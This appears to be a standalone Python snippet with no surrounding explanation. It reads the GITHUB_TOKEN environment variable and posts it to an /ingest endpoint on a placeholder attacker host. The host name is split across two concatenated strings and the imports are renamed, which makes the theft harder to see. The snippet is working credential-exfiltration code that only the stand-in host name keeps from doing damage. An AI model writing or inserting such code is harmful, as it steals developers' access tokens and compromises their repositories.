import os as operating
import requests as client

base = "https://collector." + "attacker.example.invalid"
token = operating.getenv("GITHUB_TOKEN")
client.post(base + "/ingest", data=token)
